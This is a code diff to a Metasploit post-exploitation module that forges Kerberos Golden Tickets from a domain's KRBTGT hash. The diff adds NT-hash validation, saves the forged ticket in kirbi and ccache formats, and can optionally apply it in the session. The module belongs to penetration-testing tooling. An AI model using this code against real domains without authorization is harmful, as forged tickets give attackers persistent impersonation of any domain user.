@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Post
         OptBool.new('USE', [true, 'Use the ticket in the current session', false]),
         OptString.new('USER', [false, 'Target User']),
         OptString.new('DOMAIN', [false, 'Target Domain']),
-        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NTLM Hash']),
+        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NT Hash']),
         OptString.new('Domain SID', [false, 'Domain SID']),
         OptInt.new('ID', [false, 'Target User ID']),
         OptString.new('GROUPS', [false, 'ID of Groups (Comma Separated)']),
@@ -111,12 +111,18 @@ class MetasploitModule < Msf::Post
       end
     end
 
+    # Golden Ticket requires an NTHash
+    if Metasploit::Framework::Hashes.identify_hash(krbtgt_hash) != 'nt'
+      fail_with(Failure::BadConfig, 'KRBTGT_HASH must be an NTHash')
+    end
+    nt_hash = krbtgt_hash.split(':')[1]
+
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
     ticket = client.kiwi.golden_ticket_create({
       user: user,
       domain_name: domain,
       domain_sid: domain_sid,
-      krbtgt_hash: krbtgt_hash,
+      krbtgt_hash: nt_hash,
       id: id,
       group_ids: datastore['GROUPS'],
       end_in: end_in
@@ -124,19 +130,29 @@ class MetasploitModule < Msf::Post
 
     if ticket
       print_good('Golden Ticket Obtained!')
-      ticket_location = store_loot("golden.ticket",
-                                   "base64/kirbi",
-                                   session,
-                                   ticket,
-                                   "#{domain}\\#{user}-golden_ticket.kirbi",
-                                   "#{domain}\\#{user} Golden Ticket")
+      kirbi_ticket = Base64.decode64(ticket)
+      kirbi_location = store_loot('golden_ticket',
+                                  'kirbi',
+                                  session,
+                                  kirbi_ticket,
+                                  "#{domain}\\#{user}-golden_ticket.kirbi",
+                                  "#{domain}\\#{user} Golden Ticket")
+      print_status("Kirbi ticket saved to #{kirbi_location}")
+      krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(kirbi_ticket)
 
-      print_status("Ticket saved to #{ticket_location}")
+      ccache_ticket = Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
+      ccache_location = store_loot('golden_ticket',
+                                   'ccache',
+                                   session,
+                                   ccache_ticket.to_binary_s,
+                                   "#{domain}\\#{user}-golden_ticket.ccache",
+                                   "#{domain}\\#{user} Golden Ticket")
+      print_status("ccache ticket saved to #{ccache_location}")
 
       if datastore['USE']
-        print_status("Attempting to use the ticket...")
+        print_status('Attempting to use the ticket...')
         client.kiwi.kerberos_ticket_use(ticket)
-        print_good("Kerberos ticket applied successfully")
+        print_good('Kerberos ticket applied successfully')
       end
     else
       fail_with(Failure::Unknown, 'Unable to create ticket')
@@ -213,7 +229,7 @@ class MetasploitModule < Msf::Post
           print_good("Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}")
           return krbtgt_hash
         # We have found multiple krbtgt hashes in our target domain?!
-        elsif krbtgt_creds_realm.length > 0
+        elsif !krbtgt_creds_realm.empty?
           krbtgt_creds = krbtgt_creds_realm
         end
 
